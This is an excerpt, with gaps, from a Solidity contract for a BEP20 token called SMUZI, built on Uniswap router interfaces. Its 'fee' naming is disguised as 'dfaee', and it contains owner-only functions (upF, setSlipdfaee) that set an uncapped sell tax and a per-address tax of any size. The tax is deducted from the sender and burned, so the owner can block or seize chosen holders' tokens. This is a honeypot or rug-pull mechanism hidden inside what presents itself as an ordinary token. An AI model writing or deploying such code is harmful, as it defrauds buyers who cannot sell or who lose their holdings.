...
interface IUniswapV2Factory {
    ...
    function dfaeeTo() external view returns (address);
    function dfaeeToSetter() external view returns (address);
    ...
    function setdfaeeTo(address) external;
    function setdfaeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingdfaeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingdfaeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingdfaeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingdfaeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingdfaeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract SMUZI is BEP20, Ownable {
    ...
    uint256 private _defaultSelldfaee = 0;

    uint256 private _defaultBuydfaee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipdfaee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSelldfaee = _value;
    }

    function setSlipdfaee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipdfaee[_address] = _value;
    }

    function getSlipdfaee(address _address) external view onlyownar returns (uint256) {
        return _slipdfaee[_address];
    }


    function setMAccountdfaee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountdfaee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradedfaeeAmount = 0;

        if (rF) {
            uint256 tradedfaee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradedfaee = _defaultSelldfaee;
                }
                if (from == uniswapV2Pair) {

                    tradedfaee = _defaultBuydfaee;
                }
            }
            if (_slipdfaee[from] > 0) {
                tradedfaee = _slipdfaee[from];
            }

            tradedfaeeAmount = _Amount.mul(tradedfaee).div(100);
        }


        if (tradedfaeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradedfaeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradedfaeeAmount);
            emit Transfer(from, _deadAddress, tradedfaeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradedfaeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradedfaeeAmount);
        emit Transfer(from, _to, _Amount - tradedfaeeAmount);
    }
